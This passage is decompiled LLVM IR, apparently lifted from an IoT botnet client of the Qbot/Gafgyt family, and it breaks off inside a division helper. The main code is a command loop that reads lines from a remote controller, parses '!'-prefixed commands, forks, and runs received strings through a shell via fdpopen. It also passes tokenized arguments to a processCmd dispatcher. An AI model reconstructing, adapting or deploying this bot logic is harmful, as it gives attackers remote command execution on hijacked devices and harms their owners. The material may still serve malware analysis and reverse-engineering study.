  br i1 %v9_2256c, label %dec_label_pc_22574, label %dec_label_pc_2258c

dec_label_pc_22574:                               ; preds = %dec_label_pc_22510
  %v2_22578 = load i32, i32* @global_var_42c60.61, align 4
  %v3_22584 = call i32 @HackerPrint(i32 %v2_22578, i32 ptrtoint ([5 x i8]* @global_var_38fc0.3028 to i32))
  br label %dec_label_pc_22a0c

dec_label_pc_2258c:                               ; preds = %dec_label_pc_22510
  %v6_225a0 = call i32 @strstr(i32 %v2_22a1c, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_38fc8.3030, i32 0, i32 0))
  %v9_225b4 = icmp eq i32 %v6_225a0, %v2_22a1c
  br i1 %v9_225b4, label %dec_label_pc_225bc, label %dec_label_pc_225c4

dec_label_pc_225bc:                               ; preds = %dec_label_pc_2258c
  %v1_225c0 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_225c4

dec_label_pc_225c4:                               ; preds = %dec_label_pc_2258c, %dec_label_pc_225bc
  %v2_225d8 = load i8, i8* %v4_22a2c, align 4
  %v7_225dc = icmp eq i8 %v2_225d8, 33
  br i1 %v7_225dc, label %dec_label_pc_22600, label %dec_label_pc_22a0c

dec_label_pc_22600:                               ; preds = %dec_label_pc_225c4, %dec_label_pc_22610
  %v3_225e4.sink = phi i8* [ %storemerge8, %dec_label_pc_22610 ], [ %v4_22a2c, %dec_label_pc_225c4 ]
  %v4_225e4 = ptrtoint i8* %v3_225e4.sink to i32
  %v1_225e8 = add i32 %v4_225e4, 1
  %storemerge8 = inttoptr i32 %v1_225e8 to i8*
  %v2_22604 = load i8, i8* %storemerge8, align 1
  %v7_22608 = icmp eq i8 %v2_22604, 32
  br i1 %v7_22608, label %dec_label_pc_22620, label %dec_label_pc_22610

dec_label_pc_22610:                               ; preds = %dec_label_pc_22600
  %v2_22614 = load i8, i8* %storemerge8, align 1
  %v2_22618 = icmp eq i8 %v2_22614, 0
  br i1 %v2_22618, label %dec_label_pc_22620, label %dec_label_pc_22600

dec_label_pc_22620:                               ; preds = %dec_label_pc_22610, %dec_label_pc_22600
  %v2_22624 = load i8, i8* %storemerge8, align 1
  %v2_22628 = icmp eq i8 %v2_22624, 0
  br i1 %v2_22628, label %dec_label_pc_22a0c, label %dec_label_pc_22630

dec_label_pc_22630:                               ; preds = %dec_label_pc_22620
  store i8 0, i8* %storemerge8, align 1
  %v3_22650 = call i32 @strlen(i8* %v5_22644)
  %v2_22660 = add i32 %v3_22650, %v2_22a1c
  %v1_22664 = add i32 %v2_22660, 2
  %v5_22668 = inttoptr i32 %v1_22664 to i8*
  %v1_22698 = add i32 %v2_22660, 1
  br label %dec_label_pc_22694

dec_label_pc_22670:                               ; preds = %dec_label_pc_226bc, %dec_label_pc_22694
  %v3_22680 = call i32 @strlen(i8* %v5_22668)
  %v2_22688 = add i32 %v1_22698, %v3_22680
  %v3_22690 = inttoptr i32 %v2_22688 to i8*
  store i8 0, i8* %v3_22690, align 1
  br label %dec_label_pc_22694

dec_label_pc_22694:                               ; preds = %dec_label_pc_22630, %dec_label_pc_22670
  %v3_226a4 = call i32 @strlen(i8* %v5_22668)
  %v2_226ac = add i32 %v1_22698, %v3_226a4
  %v1_226b0 = inttoptr i32 %v2_226ac to i8*
  %v2_226b0 = load i8, i8* %v1_226b0, align 1
  %v7_226b4 = icmp eq i8 %v2_226b0, 10
  br i1 %v7_226b4, label %dec_label_pc_22670, label %dec_label_pc_226bc

dec_label_pc_226bc:                               ; preds = %dec_label_pc_22694
  store i32 %v1_22698, i32* @r4, align 4
  %v3_226cc = call i32 @strlen(i8* %v5_22668)
  %v0_226d4 = load i32, i32* @r4, align 4
  %v2_226d4 = add i32 %v0_226d4, %v3_226cc
  %v1_226d8 = inttoptr i32 %v2_226d4 to i8*
  %v2_226d8 = load i8, i8* %v1_226d8, align 1
  %v7_226dc = icmp eq i8 %v2_226d8, 13
  br i1 %v7_226dc, label %dec_label_pc_22670, label %dec_label_pc_226e4

dec_label_pc_226e4:                               ; preds = %dec_label_pc_226bc
  %v2_2270021 = load i8, i8* %v5_22668, align 1
  %v7_2270425 = icmp eq i8 %v2_2270021, 32
  br i1 %v7_2270425, label %dec_label_pc_2271c, label %dec_label_pc_2270c

dec_label_pc_226f0:                               ; preds = %dec_label_pc_2270c
  %v1_226f4 = add i32 %v4_226fc27, 1
  %v5_226f8 = inttoptr i32 %v1_226f4 to i8*
  %v2_22700 = load i8, i8* %v5_226f8, align 1
  %v7_22704 = icmp eq i8 %v2_22700, 32
  br i1 %v7_22704, label %dec_label_pc_2271c, label %dec_label_pc_2270c

dec_label_pc_2270c:                               ; preds = %dec_label_pc_226e4, %dec_label_pc_226f0
  %v4_226fc27 = phi i32 [ %v1_226f4, %dec_label_pc_226f0 ], [ %v1_22664, %dec_label_pc_226e4 ]
  %stack_var_-64.026 = phi i8* [ %v5_226f8, %dec_label_pc_226f0 ], [ %v5_22668, %dec_label_pc_226e4 ]
  %v2_22710 = load i8, i8* %stack_var_-64.026, align 1
  %v2_22714 = icmp eq i8 %v2_22710, 0
  br i1 %v2_22714, label %dec_label_pc_2271c, label %dec_label_pc_226f0

dec_label_pc_2271c:                               ; preds = %dec_label_pc_226f0, %dec_label_pc_2270c, %dec_label_pc_226e4
  %stack_var_-64.0.lcssa = phi i8* [ %v5_22668, %dec_label_pc_226e4 ], [ %v5_226f8, %dec_label_pc_226f0 ], [ %stack_var_-64.026, %dec_label_pc_2270c ]
  %v4_226fc.lcssa = phi i32 [ %v1_22664, %dec_label_pc_226e4 ], [ %v1_226f4, %dec_label_pc_226f0 ], [ %v4_226fc27, %dec_label_pc_2270c ]
  store i8 0, i8* %stack_var_-64.0.lcssa, align 1
  %v1_2272c = add i32 %v4_226fc.lcssa, 1
  %v2_2277032 = load i8, i8* %v5_22668, align 1
  %v2_2277434 = icmp eq i8 %v2_2277032, 0
  br i1 %v2_2277434, label %dec_label_pc_2277c, label %dec_label_pc_22740

dec_label_pc_22740:                               ; preds = %dec_label_pc_2271c, %dec_label_pc_22740
  %storemerge736 = phi i8* [ %storemerge7, %dec_label_pc_22740 ], [ %v5_22668, %dec_label_pc_2271c ]
  %storemerge1635 = phi i32 [ %v1_22764, %dec_label_pc_22740 ], [ %v1_22664, %dec_label_pc_2271c ]
  %v2_22744 = load i8, i8* %storemerge736, align 1
  %v3_22744 = zext i8 %v2_22744 to i32
  %v1_2274c = call i32 @__GI_toupper(i32 %v3_22744)
  %v1_2275c = trunc i32 %v1_2274c to i8
  store i8 %v1_2275c, i8* %storemerge736, align 1
  %v1_22764 = add i32 %storemerge1635, 1
  %storemerge7 = inttoptr i32 %v1_22764 to i8*
  %v2_22770 = load i8, i8* %storemerge7, align 1
  %v2_22774 = icmp eq i8 %v2_22770, 0
  br i1 %v2_22774, label %dec_label_pc_2277c, label %dec_label_pc_22740

dec_label_pc_2277c:                               ; preds = %dec_label_pc_22740, %dec_label_pc_2271c
  store i32 ptrtoint ([5 x i8]* @global_var_38fcc.3032 to i32), i32* @r1, align 4
  %v4_22788 = call i32 @__GI_strcoll(i8* %v5_22668, i32 ptrtoint ([5 x i8]* @global_var_38fcc.3032 to i32))
  %v2_22790 = icmp eq i32 %v4_22788, 0
  br i1 %v2_22790, label %dec_label_pc_22798, label %dec_label_pc_22888

dec_label_pc_22798:                               ; preds = %dec_label_pc_2277c
  %v0_22798 = call i32 @listFork()
  %v2_227a0 = icmp eq i32 %v0_22798, 0
  br i1 %v2_227a0, label %dec_label_pc_227a8, label %dec_label_pc_22a0c

dec_label_pc_227a8:                               ; preds = %dec_label_pc_22798
  %v4_227c4 = call i32 @__GI_memset(i8* %v3_227c4, i32 0, i32 32676)
  %v6_227e4 = call i32 @szprintf(i32 %v2_227b0, i32 ptrtoint ([8 x i8]* @global_var_38fd4.3034 to i32), i32 %v1_2272c, i32 %v2_227b0, i32 ptrtoint (i32* @0 to i32))
  %v3_22800 = call i32 @fdpopen(i32 %v2_227b0, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_38fdc.3036, i32 0, i32 0))
  br label %dec_label_pc_2284c

dec_label_pc_22810:                               ; preds = %dec_label_pc_2284c
  %v2_22820 = call i32 @trim(i8* %v3_227c4)
  %v4_22840 = call i32 @__GI_memset(i8* %v3_227c4, i32 0, i32 32676)
  %v1_22848 = call i32 @sleep(i32 1)
  br label %dec_label_pc_2284c

dec_label_pc_2284c:                               ; preds = %dec_label_pc_227a8, %dec_label_pc_22810
  %v4_22868 = call i32 @fdgets(i32 %v2_227b0, i32 32676, i32 %v3_22800, i32 %v2_227b0)
  %v2_22870 = icmp eq i32 %v4_22868, 0
  br i1 %v2_22870, label %dec_label_pc_22878, label %dec_label_pc_22810

dec_label_pc_22878:                               ; preds = %dec_label_pc_2284c
  %v1_2287c = call i32 @fdpclose(i32 %v3_22800)
  %v1_22884 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_22888

dec_label_pc_22888:                               ; preds = %dec_label_pc_2277c, %dec_label_pc_22878
  %v2_2289c = call i32 @__GI_strtok(i32 %v1_2272c, i32 ptrtoint (i32* @global_var_38fe0.3038 to i32))
  store i32 %v1_22664, i32* %stack_var_-132, align 4
  %v2_2299439 = icmp eq i32 %v2_2289c, 0
  br i1 %v2_2299439, label %dec_label_pc_2299c, label %dec_label_pc_228b4

dec_label_pc_228b4:                               ; preds = %dec_label_pc_22888, %dec_label_pc_2297c
  %stack_var_-36.042.in = phi i32 [ %v2_22984, %dec_label_pc_2297c ], [ %v2_2289c, %dec_label_pc_22888 ]
  %stack_var_-40.140 = phi i32 [ %stack_var_-40.0, %dec_label_pc_2297c ], [ 1, %dec_label_pc_22888 ]
  %stack_var_-36.042 = inttoptr i32 %stack_var_-36.042.in to i8*
  %v2_228b8 = load i8, i8* %stack_var_-36.042, align 1
  %v7_228bc = icmp eq i8 %v2_228b8, 10
  br i1 %v7_228bc, label %dec_label_pc_2297c, label %dec_label_pc_228c4

dec_label_pc_228c4:                               ; preds = %dec_label_pc_228b4
  store i32 %stack_var_-40.140, i32* @r4, align 4
  %v3_228d0 = call i32 @strlen(i8* nonnull %stack_var_-36.042)
  %v1_228d8 = add i32 %v3_228d0, 1
  %v1_228e0 = call i32 @malloc(i32 %v1_228d8)
  %v0_228f0 = load i32, i32* @r4, align 4
  %v3_228f0 = mul i32 %v0_228f0, 4
  %v2_228fc = add i32 %v2_229dc, %v3_228f0
  %v2_22900 = inttoptr i32 %v2_228fc to i32*
  store i32 %v1_228e0, i32* %v2_22900, align 4
  %v3_2290c = mul i32 %stack_var_-40.140, 4
  %v2_22918 = add i32 %v2_229dc, %v3_2290c
  %v1_2291c = inttoptr i32 %v2_22918 to i32*
  %v2_2291c = load i32, i32* %v1_2291c, align 4
  store i32 %v2_2291c, i32* @r4, align 4
  %v3_22928 = call i32 @strlen(i8* nonnull %stack_var_-36.042)
  %v1_22930 = add i32 %v3_22928, 1
  %v0_22934 = load i32, i32* @r4, align 4
  %v3_22940 = inttoptr i32 %v0_22934 to i8*
  %v4_22940 = call i32 @__GI_memset(i8* %v3_22940, i32 0, i32 %v1_22930)
  %v2_2295c = load i32, i32* %v1_2291c, align 4
  store i32 %stack_var_-36.042.in, i32* @r1, align 4
  %v3_2296c = inttoptr i32 %v2_2295c to i8*
  %v4_2296c = call i32 @strcpy(i8* %v3_2296c, i32 %stack_var_-36.042.in)
  %v1_22974 = add i32 %stack_var_-40.140, 1
  br label %dec_label_pc_2297c

dec_label_pc_2297c:                               ; preds = %dec_label_pc_228b4, %dec_label_pc_228c4
  %stack_var_-40.0 = phi i32 [ %stack_var_-40.140, %dec_label_pc_228b4 ], [ %v1_22974, %dec_label_pc_228c4 ]
  %v2_22984 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_38fe0.3038 to i32))
  %v2_22994 = icmp eq i32 %v2_22984, 0
  br i1 %v2_22994, label %dec_label_pc_2299c, label %dec_label_pc_228b4

dec_label_pc_2299c:                               ; preds = %dec_label_pc_2297c, %dec_label_pc_22888
  %stack_var_-40.1.lcssa = phi i32 [ 1, %dec_label_pc_22888 ], [ %stack_var_-40.0, %dec_label_pc_2297c ]
  %v3_229a8 = call i32 @processCmd(i32 %stack_var_-40.1.lcssa, i32* nonnull %stack_var_-132)
  %v7_229b4 = icmp slt i32 %stack_var_-40.1.lcssa, 2
  br i1 %v7_229b4, label %dec_label_pc_22a0c, label %dec_label_pc_229cc.lr.ph

dec_label_pc_229cc.lr.ph:                         ; preds = %dec_label_pc_2299c
  br label %dec_label_pc_229cc

dec_label_pc_229cc:                               ; preds = %dec_label_pc_229cc.lr.ph, %dec_label_pc_229cc
  %storemerge17113 = phi i32 [ 1, %dec_label_pc_229cc.lr.ph ], [ %v1_229f4, %dec_label_pc_229cc ]
  %v3_229d4 = mul i32 %storemerge17113, 4
  %v2_229e0 = add i32 %v2_229dc, %v3_229d4
  %v1_229e4 = inttoptr i32 %v2_229e0 to i32*
  %v2_229e4 = load i32, i32* %v1_229e4, align 4
  store i32 %v2_229e4, i32* @r0, align 4
  %v0_229ec = call i32 @free()
  %v1_229f4 = add nuw nsw i32 %storemerge17113, 1
  %v5_22a08 = icmp slt i32 %v1_229f4, %stack_var_-40.1.lcssa
  br i1 %v5_22a08, label %dec_label_pc_229cc, label %dec_label_pc_22a0c

dec_label_pc_22a0c:                               ; preds = %dec_label_pc_229cc, %dec_label_pc_22798, %dec_label_pc_225c4, %dec_label_pc_2299c, %dec_label_pc_22620, %dec_label_pc_22574, %dec_label_pc_221e0
  %v2_22a10 = load i32, i32* @global_var_42c60.61, align 4
  %v5_22a2c = call i32 @recvLine(i32 %v2_22a10, i8* %v4_22a2c, i32 4096, i32 %v2_22a1c)
  %v3_22a3c = icmp eq i32 %v5_22a2c, -1
  br i1 %v3_22a3c, label %dec_label_pc_221c4, label %dec_label_pc_2249c

; uselistorder directives
  uselistorder i32 %v5_22a2c, { 1, 0 }
  uselistorder i32 %stack_var_-40.1.lcssa, { 2, 0, 1 }
  uselistorder i32 %v2_22984, { 1, 0 }
  uselistorder i8* %stack_var_-36.042, { 2, 1, 0 }
  uselistorder i32 %stack_var_-40.140, { 1, 3, 0, 2 }
  uselistorder i8* %storemerge7, { 1, 0 }
  uselistorder i32 %v1_22764, { 1, 0 }
  uselistorder i8* %storemerge736, { 1, 0 }
  uselistorder i32 %v1_2272c, { 1, 0 }
  uselistorder i32 %v1_22698, { 2, 1, 0 }
  uselistorder i8* %v5_22668, { 5, 0, 3, 2, 1, 4, 6, 8, 7 }
  uselistorder i32 %v1_22664, { 3, 0, 2, 1, 4 }
  uselistorder i8* %storemerge8, { 0, 1, 3, 4, 2 }
  uselistorder i1 %v9_224d8, { 1, 0 }
  uselistorder i32 %v3_224a4, { 1, 0 }
  uselistorder i32 %storemerge14, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v3_223c4, { 1, 0 }
  uselistorder i32 %v1_223a8, { 1, 0 }
  uselistorder i32 %v1_22278, { 1, 2, 0, 3 }
  uselistorder i32 %v3_22294, { 1, 0 }
  uselistorder i32 %v2_22288, { 1, 0 }
  uselistorder i32 %v2_229dc, { 2, 0, 1 }
  uselistorder i32 %v2_227b0, { 2, 3, 4, 1, 0 }
  uselistorder i8* %v4_22a2c, { 3, 0, 1, 2 }
  uselistorder i32 %v2_22a1c, { 7, 0, 3, 4, 5, 6, 1, 2 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @fdgets, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @szprintf, { 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 45, 44, 43, 42, 41, 40 }
  uselistorder i32 32676, { 1, 0, 2, 7, 6, 5, 3, 4 }
  uselistorder i32 ()* @listFork, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i32* @global_var_42c68.69, { 2, 3, 0, 4, 5, 6, 7, 1, 8 }
  uselistorder i32* @global_var_49990.72, { 0, 2, 3, 4, 5, 6, 7, 8, 1, 11, 9, 10 }
  uselistorder i32 (i32, i32)* @HackerPrint, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 21, 20, 0 }
  uselistorder i32* @global_var_42c60.61, { 2, 3, 4, 0, 1, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32 (i32)* @sleep, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @init_rand, { 1, 0 }
  uselistorder i32 (i32)* @srand, { 2, 1, 0 }
  uselistorder i32 ()* @__getpid, { 2, 1, 0 }
  uselistorder i32 (i32*)* @__GI_time, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 1, 2, 3, 4, 5, 6, 20, 21 }
  uselistorder i32 (i32)* @__GI_inet_ntoa, { 4, 3, 2, 1, 0 }
  uselistorder i32* @global_var_49980.2631, { 1, 2, 0, 5, 3, 4 }
  uselistorder i32 ()* @getBuild, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @access, { 1, 0 }
  uselistorder label %dec_label_pc_22a0c, { 0, 3, 1, 4, 2, 5, 6 }
  uselistorder label %dec_label_pc_229cc, { 1, 0 }
  uselistorder label %dec_label_pc_2297c, { 1, 0 }
  uselistorder label %dec_label_pc_228b4, { 1, 0 }
  uselistorder label %dec_label_pc_22888, { 1, 0 }
  uselistorder label %dec_label_pc_2284c, { 1, 0 }
  uselistorder label %dec_label_pc_22740, { 1, 0 }
  uselistorder label %dec_label_pc_2271c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_2270c, { 1, 0 }
  uselistorder label %dec_label_pc_22694, { 1, 0 }
  uselistorder label %dec_label_pc_22600, { 1, 0 }
  uselistorder label %dec_label_pc_225c4, { 1, 0 }
  uselistorder label %dec_label_pc_22510, { 1, 0 }
  uselistorder label %dec_label_pc_22490, { 1, 0 }
  uselistorder label %dec_label_pc_22400, { 1, 0 }
  uselistorder label %dec_label_pc_223c0, { 1, 0 }
  uselistorder label %dec_label_pc_222c8, { 1, 0 }
  uselistorder label %dec_label_pc_22284, { 1, 0 }
  uselistorder label %dec_label_pc_221c4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_221ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_22048, { 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_22a98 = load i32, i32* @r1, align 4
  %v1_22a98 = add i32 %v0_22a98, -1
  store i32 %v1_22a98, i32* %r2.global-to-local, align 4
  %v2_22a98 = icmp eq i32 %v0_22a98, 0
  %v7_22a98 = icmp eq i32 %v0_22a98, 1
  %v0_22a9c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_22a98, i32 %v0_22a9c)
  br i1 %v2_22a98, label %dec_label_pc_22b80, label %dec_label_pc_22aa4

dec_label_pc_22aa4:                               ; preds = %entry
  %v0_22aa4 = load i32, i32* %r0.global-to-local, align 4
  %v1_22aa4 = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_22aa4, %v1_22aa4
  br i1 %tmp, label %dec_label_pc_22aac, label %dec_label_pc_22b38

dec_label_pc_22aac:                               ; preds = %dec_label_pc_22aa4
  %v1_22aac = load i32, i32* %r2.global-to-local, align 4
  %v2_22aac = and i32 %v1_22aac, %v1_22aa4
  %v4_22aac = icmp eq i32 %v2_22aac, 0
  br i1 %v4_22aac, label %dec_label_pc_22b44, label %dec_label_pc_22ab4

dec_label_pc_22ab4:                               ; preds = %dec_label_pc_22aac
  %v3_22ab4 = icmp ult i32 %v1_22aa4, 536870912
  br i1 %v3_22ab4, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_22ab4
  %v4_22ab8 = mul i32 %v1_22aa4, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_22ab4, %.thread
  %v0_22ad8.pr36.ph = phi i32 [ %v4_22ab8, %.thread ], [ %v1_22aa4, %dec_label_pc_22ab4 ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_22ab4 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_22ad8.pr36 = phi i32 [ %v4_22acc, %bb81 ], [ %v0_22ad8.pr36.ph, %.preheader.preheader ]
  %v1_22ad0 = phi i32 [ %v4_22ad0, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_22ac4 = icmp ugt i32 %v0_22ad8.pr36, 268435455
  br i1 %v2_22ac4, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_22ad8thread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_22ac8 = icmp ult i32 %v0_22ad8.pr36, %v0_22aa4
  br i1 %v4_22ac8, label %bb80, label %dec_label_pc_22ad8thread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_22acc = and i32 %v0_22ad8.pr36, 268435456
  %v3_22acc = icmp eq i32 %v2_22acc, 0
  %v4_22acc = mul i32 %v0_22ad8.pr36, 16
  br i1 %v3_22acc, label %bb81, label %dec_label_pc_22ad8.loopexit

bb81:                                             ; preds = %bb80
  %v2_22ad0 = and i32 %v1_22ad0, 268435456
  %v3_22ad0 = icmp eq i32 %v2_22ad0, 0
  %v4_22ad0 = mul i32 %v1_22ad0, 16
  br i1 %v3_22ad0, label %.preheader, label %dec_label_pc_22ad8thread-pre-split.loopexit.loopexit

dec_label_pc_22ad8thread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_22ae448.ph = phi i32 [ %v1_22ad0, %bb ], [ %v4_22ad0, %bb81 ]
  %v0_22ad8.pr38.ph = phi i32 [ %v0_22ad8.pr36, %bb ], [ %v4_22acc, %bb81 ]
  br label %dec_label_pc_22ad8thread-pre-split.loopexit

dec_label_pc_22ad8thread-pre-split.loopexit:      ; preds = %dec_label_pc_22ad8thread-pre-split.loopexit.loopexit, %.thread2
  %v1_22ae448 = phi i32 [ %v1_22ad0, %.thread2 ], [ %v1_22ae448.ph, %dec_label_pc_22ad8thread-pre-split.loopexit.loopexit ]
  %v0_22ad8.pr38 = phi i32 [ %v0_22ad8.pr36, %.thread2 ], [ %v0_22ad8.pr38.ph, %dec_label_pc_22ad8thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_22ad8thread-pre-split

dec_label_pc_22ad8thread-pre-split:               ; preds = %dec_label_pc_22ad8thread-pre-split.loopexit, %bb83
  %v1_22ae446 = phi i32 [ %v1_22ae448, %dec_label_pc_22ad8thread-pre-split.loopexit ], [ %v3_22ae4, %bb83 ]
  %v0_22ad8.pr = phi i32 [ %v0_22ad8.pr38, %dec_label_pc_22ad8thread-pre-split.loopexit ], [ %v3_22ae0, %bb83 ]
  br label %dec_label_pc_22ad8

dec_label_pc_22ad8.loopexit:                      ; preds = %bb80
  br label %dec_label_pc_22ad8

dec_label_pc_22ad8:                               ; preds = %dec_label_pc_22ad8.loopexit, %dec_label_pc_22ad8thread-pre-split
  %v1_22ae4 = phi i32 [ %v1_22ae446, %dec_label_pc_22ad8thread-pre-split ], [ %v1_22ad0, %dec_label_pc_22ad8.loopexit ]
  %v1_22ae0 = phi i32 [ %v0_22ad8.pr, %dec_label_pc_22ad8thread-pre-split ], [ %v4_22acc, %dec_label_pc_22ad8.loopexit ]
  %v2_22ad8 = icmp slt i32 %v1_22ae0, 0
  br i1 %v2_22ad8, label %dec_label_pc_22aec, label %bb82

bb82:                                             ; preds = %dec_label_pc_22ad8
  %v4_22adc = icmp ult i32 %v1_22ae0, %v0_22aa4
  br i1 %v4_22adc, label %bb83, label %dec_label_pc_22aec

bb83:                                             ; preds = %bb82
  %v3_22ae0 = mul i32 %v1_22ae0, 2
  %v2_22ae4 = icmp slt i32 %v1_22ae4, 0
  %v3_22ae4 = mul i32 %v1_22ae4, 2
  br i1 %v2_22ae4, label %dec_label_pc_22aec, label %dec_label_pc_22ad8thread-pre-split

dec_label_pc_22aec:                               ; preds = %bb82, %dec_label_pc_22ad8, %bb83
  %v2_22af859 = phi i32 [ %v3_22ae4, %bb83 ], [ %v1_22ae4, %bb82 ], [ %v1_22ae4, %dec_label_pc_22ad8 ]
  %v1_22af051 = phi i32 [ %v3_22ae0, %bb83 ], [ %v1_22ae0, %bb82 ], [ %v1_22ae0, %dec_label_pc_22ad8 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_22af0

dec_label_pc_22af0:                               ; preds = %.thread11, %dec_label_pc_22aec
  %v1_22b24 = phi i32 [ %v4_22b24, %.thread11 ], [ %v2_22af859, %dec_label_pc_22aec ]
  %v1_22af8 = phi i32 [ %v0_22b30, %.thread11 ], [ 0, %dec_label_pc_22aec ]
  %v1_22b28 = phi i32 [ %v4_22b28, %.thread11 ], [ %v1_22af051, %dec_label_pc_22aec ]
  %v1_22af4 = phi i32 [ %v0_22b20, %.thread11 ], [ %v0_22aa4, %dec_label_pc_22aec ]
  %v3_22af0 = icmp ult i32 %v1_22af4, %v1_22b28
  br i1 %v3_22af0, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_22af0
  %v3_22af4 = sub i32 %v1_22af4, %v1_22b28
  store i32 %v3_22af4, i32* %r0.global-to-local, align 4
  %v3_22af8 = or i32 %v1_22af8, %v1_22b24
  store i32 %v3_22af8, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_22af0, %bb84
  %v1_22b00 = phi i32 [ %v1_22af4, %dec_label_pc_22af0 ], [ %v3_22af4, %bb84 ]
  %v1_22b04 = phi i32 [ %v1_22af8, %dec_label_pc_22af0 ], [ %v3_22af8, %bb84 ]
  %v4_22afc = udiv i32 %v1_22b28, 2
  %v6_22afc = icmp ult i32 %v1_22b00, %v4_22afc
  br i1 %v6_22afc, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_22b00 = urem i32 %v1_22b28, 2
  %v4_22b00 = icmp eq i32 %v3_22b00, 0
  %v6_22b00 = sub i32 %v1_22b00, %v4_22afc
  store i32 %v6_22b00, i32* %r0.global-to-local, align 4
  br i1 %v4_22b00, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_22b04 = udiv i32 %v1_22b24, 2
  %v6_22b04 = or i32 %v1_22b04, %v5_22b04
  store i32 %v6_22b04, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_22b0c = phi i32 [ %v6_22b00, %bb85 ], [ %v1_22b00, %.thread7 ], [ %v6_22b00, %bb86 ]
  %v1_22b10 = phi i32 [ %v1_22b04, %bb85 ], [ %v1_22b04, %.thread7 ], [ %v6_22b04, %bb86 ]
  %v4_22b08 = udiv i32 %v1_22b28, 4
  %v6_22b08 = icmp ult i32 %v1_22b0c, %v4_22b08
  br i1 %v6_22b08, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_22b0c = and i32 %v1_22b28, 2
  %v4_22b0c = icmp eq i32 %v3_22b0c, 0
  %v6_22b0c = sub i32 %v1_22b0c, %v4_22b08
  store i32 %v6_22b0c, i32* %r0.global-to-local, align 4
  br i1 %v4_22b0c, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_22b10 = udiv i32 %v1_22b24, 4
  %v6_22b10 = or i32 %v1_22b10, %v5_22b10
  store i32 %v6_22b10, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_22b18 = phi i32 [ %v6_22b0c, %bb87 ], [ %v1_22b0c, %.thread8 ], [ %v6_22b0c, %bb88 ]
  %v1_22b1c = phi i32 [ %v1_22b10, %bb87 ], [ %v1_22b10, %.thread8 ], [ %v6_22b10, %bb88 ]
  %v4_22b14 = udiv i32 %v1_22b28, 8
  %v6_22b14 = icmp ult i32 %v1_22b18, %v4_22b14
  br i1 %v6_22b14, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_22b18 = and i32 %v1_22b28, 4
  %v4_22b18 = icmp eq i32 %v3_22b18, 0
  %v6_22b18 = sub i32 %v1_22b18, %v4_22b14
  store i32 %v6_22b18, i32* %r0.global-to-local, align 4
  br i1 %v4_22b18, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_22b1c = udiv i32 %v1_22b24, 8
  %v6_22b1c = or i32 %v1_22b1c, %v5_22b1c
